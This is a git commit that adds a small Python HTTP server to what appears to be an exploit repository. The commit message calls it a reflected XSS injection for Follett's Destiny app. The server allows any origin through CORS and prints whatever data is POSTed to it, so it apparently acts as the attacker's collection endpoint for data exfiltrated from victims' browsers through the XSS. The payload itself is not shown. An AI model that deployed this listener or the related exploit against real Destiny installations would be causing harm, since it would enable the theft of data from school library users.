9645be6c50a4b2b93b6853279b14cdd3e4726441
Oracle <122638969+Oracle-Security@users.noreply.github.com>
2023-07-11 16:02:34 -0400

    Adding a reflected XSS Injection for Destiny app

---
+++ Follett Learning Solutions/Destiny/server.py
@@ -0,0 +1,19 @@
+﻿#!/usr/bin/env python3
+from http.server import HTTPServer, SimpleHTTPRequestHandler, test
+import sys
+
+class CORSRequestHandler (SimpleHTTPRequestHandler):
+    def end_headers (self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        SimpleHTTPRequestHandler.end_headers(self)
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+        # Log the post_data or perform any other desired actions
+        print("Received POST data:", post_data)
+        self.send_response(200)
+        self.send_header('Content-type','text/html')
+        self.end_headers()
+
+if __name__ == '__main__':
+    test(CORSRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 9999)
